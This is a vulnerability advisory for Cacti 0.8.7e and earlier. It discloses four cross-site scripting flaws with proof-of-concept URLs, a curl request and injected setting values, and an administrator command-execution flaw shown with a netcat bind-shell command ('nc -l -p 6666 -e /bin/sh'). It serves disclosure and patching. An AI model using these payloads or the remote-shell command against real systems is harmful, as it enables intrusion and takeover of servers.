@@ -1,0 +1,137 @@
+Moritz Naumann <security@moritz-naumann.com>
+
+cacti:
+http://www.cacti.net/
+
+=================================================================
+Cacti 0.8.7e and earlier versions are affected by multiple security
+issues. Issues 1-4 are cross site scripting issues, issue 5 is a
+priviledge escalation issue.
+
+
+
+
+1. XSS 1
+
+A HTTP GET request against the following URL will, on a web browser
+with Javascript support, cause a dialog box saying '1' to be displayed:
+
+http://CACTIHOST/graph.php?action=zoom&local_graph_id=1&graph_end=1%27%20style=visibility:hidden%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cx%20y=%27
+
+This vulnerability is only exploitable if the victim is allowed to view
+graphs. This will be true if the victim has previously authenticated
+against Cacti or if both the guest user has been activated (default:
+disabled) and the graph view permission was set to 'guest' (default:
+'No User').
+
+This vulnerability was tested with Firefox 3.0.6.
+
+The Cacti group provides a patch to fix this vulnerability:
+http://www.cacti.net/downloads/patches/0.8.7e/cross_site_fix.patch
+
+
+
+2. XSS 2
+
+The following curl invocation will generate a HTTP POST request
+against
+
+http://CACTIHOST/graph_view.php?action=tree&tree_id=1&leaf_id=7&select_first=true
+
+with an 'application/x-www-form-urlencoded' content type HTTP body part
+containing
+ date1=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cx+y%3D%27'
+Curl will write the resulting output to a file named poc.html.
+
+> curl -d 'date1=%27%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E%3Cx+y%3D%27' 'http://CACTIHOST/graph_view.php?action=tree&tree_id=1&leaf_id=7&select_first=true' > poc.html
+
+When this file is loaded and rendered by a web browser with Javascript
+support, this will cause a dialog box saying '2' to be displayed.
+
+This vulnerability is only exploitable if the victim is allowed to view
+graphs. This will be true if the victim has previously authenticated
+against Cacti or if both the guest user has been activated (default:
+disabled) and the graph view permission was set to 'guest' (default:
+'No User').
+
+The Cacti group provides a patch to fix this vulnerability:
+http://www.cacti.net/downloads/patches/0.8.7e/cross_site_fix.patch
+
+
+
+3. XSS 3
+
+If an attacker or the victim has permission to modify the graph
+display settings via graph_settings.php, the attacker is able to
+persistently inject javascript code via the 'page_refresh' and
+'default_dual_pane_width' parameters.
+
+Setting 'page_refresh' to the following value will, on any consecutive
+visitors' web browser with Javascript support, cause a dialog box saying
+'3' to be displayed:
+ 300'><x y='
+
+Setting 'default_dual_pane_width' to the following value will, on any
+consecutive visitors' web browser with Javascript support, cause a
+dialog box saying '3' to be displayed:
+ 200"><x y="
+
+The Cacti group provides a patch to fix this vulnerability:
+http://www.cacti.net/downloads/patches/0.8.7e/cross_site_fix.patch
+
+
+
+4. XSS 4
+
+A HTTP GET request against the following URL will, on a web browser
+with Javascript support, cause a dialog box saying '4' to be displayed:
+
+> >
+http://CACTIHOST/graph.php?action=properties&local_graph_id=201&rra_id=0&view_type=tree&graph_start=%3C/pre%3E%3Cscript%3Ealert(4)%3C/script%3E%3Cpre%3E
+
+This vulnerability is only exploitable if the victim is allowed to view
+graphs. This will be true if the victim has previously authenticated
+against Cacti or if both the guest user has been activated (default:
+disabled) and the graph view permission was set to 'guest' (default:
+'No User').
+
+Alternatively, a similar injection can be achieved, if an attacker or
+his victim has permission to modify the graph display settings via
+graph_settings.php. If so, the attacker is able to persistently inject
+javascript code via the 'title_size', 'legend_size', 'axis_size' and
+'unit_size' parameters.
+
+Setting any of these parameters to the following value will, on any
+consecutive visitors' web browser with Javascript support, cause a
+dialog box saying '4' to be displayed:
+ 8</pre><pre>
+
+This vulnerability was tested with Firefox 3.0.6
+
+The Cacti group provides a patch to fix this vulnerability:
+http://www.cacti.net/downloads/patches/0.8.7e/cross_site_fix.patch
+
+
+
+5. Priviledge escalation
+
+Finally, due to the permissive way the web interface allows Cacti
+to be configured, a cacti administrator is also able to execute
+arbitrary commands on the system as the user the Cacti polling mechanism
+ runs as (usually a non-priviledged user).
+
+For example, it is possible to successfully spawn (and connect to) a
+backdoor/remote shell on the Cacti system by changing the "Data Input
+Method" for "Linux - Get Memory Usage". Setting "Input String" to
+ nohup nc -l -p 6666 -n -e /bin/sh &
+would spawn a remotely accessible shell whenever this handler was called
+(every couple of minutes by default on my Debian test system).
+
+Cacti developers say:
+> There is no effective way to fix the data input method without breaking Cacti.  It will be reviewed for the release of 0.8.8.
+
+
+
+The XSS issues are currently tracked as CVE-2009-4032 (additional CVEs
+may or may not be assigned), issue 5 has not been tracked so far (to my
+knowledge).
